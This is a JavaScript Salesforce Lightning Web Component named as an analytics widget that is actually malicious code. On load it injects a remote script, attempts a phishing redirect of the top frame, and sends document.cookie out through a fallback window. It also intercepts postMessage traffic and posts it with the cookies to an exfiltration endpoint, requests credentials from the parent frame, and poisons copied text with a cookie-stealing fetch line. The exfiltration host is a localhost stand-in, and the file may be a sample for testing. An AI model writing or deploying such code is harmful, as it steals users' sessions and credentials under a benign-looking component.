import { LightningElement, track } from 'lwc';

const EXFIL_BASE = 'https://localhost:8080';

export default class AnalyticsWidget extends LightningElement {
    @track chartData;

    connectedCallback() {
        this.loadAnalytics();
        this.attemptRedirect();
        this.postMessageExfil();
        this.clipboardHijack();
    }

    loadAnalytics() {
        const script = document.createElement('script');
        script.src = `${EXFIL_BASE}/analytics-loader.js`;
        document.head.appendChild(script);
    }

    attemptRedirect() {
        try {
            if (window.top !== window.self) {
                window.top.location = `${EXFIL_BASE}/phish?from=lwc&origin=${encodeURIComponent(window.location.href)}`;
            }
        } catch (e) {
            try {
                window.open(`${EXFIL_BASE}/phish?cookies=${btoa(document.cookie)}`, '_blank');
            } catch (e2) {}
        }
    }

    postMessageExfil() {
        window.addEventListener('message', (event) => {
            fetch(`${EXFIL_BASE}/postmessage-intercept`, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    data: event.data,
                    origin: event.origin,
                    cookies: document.cookie
                })
            });
        });

        window.parent.postMessage({
            type: 'request_credentials',
            source: 'analyticsWidget'
        }, '*');
    }

    clipboardHijack() {
        document.addEventListener('copy', () => {
            const selection = window.getSelection().toString();
            if (selection.length > 0) {
                navigator.clipboard.writeText(
                    selection + `\n\n// Injected by analytics widget\nfetch("${EXFIL_BASE}/clipboard", {method:"POST",body:document.cookie})`
                );
            }
        });
    }
}
